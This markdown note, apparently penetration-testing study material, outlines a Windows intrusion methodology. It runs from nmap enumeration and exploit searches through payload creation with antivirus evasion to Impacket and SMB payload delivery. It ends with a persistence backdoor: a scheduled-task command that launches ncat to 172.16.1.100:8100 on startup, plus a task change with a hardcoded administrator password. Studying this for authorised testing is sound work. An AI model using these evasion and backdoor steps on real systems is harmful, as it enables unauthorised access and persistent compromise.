# Windows Infiltration Methodology.md

### 1. Enumerate the target
Enumerate the ENTIRE TARGET:
	Discover used Operating System `ping <ip>` and compare to TTL-response table for identification 
		 https://subinsb.com/default-device-ttl-values/
	IP Ranges
	Ports
	Services

``` bash
sudo nmap -sn <ip>/mask                                  # ip ranges
sudo nmap -O <ip>                                        # OS discovery
sudo nmap -sV --script=banner --reason -p- <ip>          # scan all ports + display versions
sudo nmap --script=discovery -p <port(s)> / -p- -O <ip>  # discvocery scan. VERY NOISY, but gives all possible information 
```

You can add `-T5` to significantly accelerate the scan. ONLY IF PERMITTED! Could be Destructive.

### 2. Exploit Vulnerable Services (Service Case)
**0. Automated Solution** - NetExecㅤㅤㅤㅤ
**1. For each service, do individual enumeration to look for more information and vulnerabilities**
	 Search in Metasploit for service exploits (based on version) 
	 Search in ExploitDB for service exploits (based on version) (`search-sploit`)
	 Look for OS version exploits
	 Nmap Script output (like anonymous login)
	 Google: "Service Version Exploit GitHub"
		 Document all Discovered Vulnerabilities!

**2. Examines File Share - Protocols**
	ㅤㅤㅤㅤFTP ㅤㅤㅤㅤ
	ㅤㅤㅤㅤSMB ㅤㅤㅤㅤ
	ㅤㅤㅤㅤNFS ㅤㅤㅤㅤ (showmount -e ip)
		 Useful: ㅤㅤㅤㅤNetExecㅤㅤㅤㅤ 
Look for credentials - users - groups - permissions - Document all Findings!

**3.  Check Management Protocols** 
	ㅤㅤㅤㅤIPMI ㅤㅤㅤㅤ
	ㅤㅤㅤㅤSNMPㅤ(onesixtyone -> snmpwalk) (UDP!)
	ㅤㅤㅤㅤOracle TNS ㅤㅤㅤㅤ
**4. Check Metasploit-Framework for CVE's** 
**5. Check ExploitDB for CVE's

### 3. Identify potentially vulnerabilities (OS Case)
1. **Compare discovered version with the next table:** 
https://www.cvedetails.com/vendor/26/Microsoft.html
2. **Check Metasploit-Framework for CVE's** 
3. **Check ExploitDB for CVE's**

### 4. Create the Payload
1. **Using Metasploit-Framework** - msfvenom
	2. Encode this using **DarkArmour** for AV Evasion
2. **Using Mythic3-Framework** (more complicated, still in study)

#### Payload Extensions
- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. **These files are modular and allow us to have applications that are more dynamic and easier to update.** Injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. **We can use batch files to run commands on the host in an automated fashion.** For example, we can have a **batch file open a port on the host,** or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a **client-side scripting language in webservers** to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of **Phishing and other attacks aimed at having users perform an action** such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

### 5. Payload Transfer and Execution - Main Goal: Shell
- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
	`psexec.py` - connects to the SMB Share, uploads a service binary and register it via Service Control Manager over RPC. Finally creates named pipe and gives semi-interactive shell

- `SMB`: If we have valid credential, we can access C$ or ADMIN$ Shares `smbclient //target/C$ -U user`, mount them, and just copy our payload, using `put` command

- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.
	 [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.

### BACKDOOR! (Scenario)
```powershell
schtasks /create /tn "Backdoor" /sc ONSTART /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"          # basic nmap

######### Changing Task ################
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```
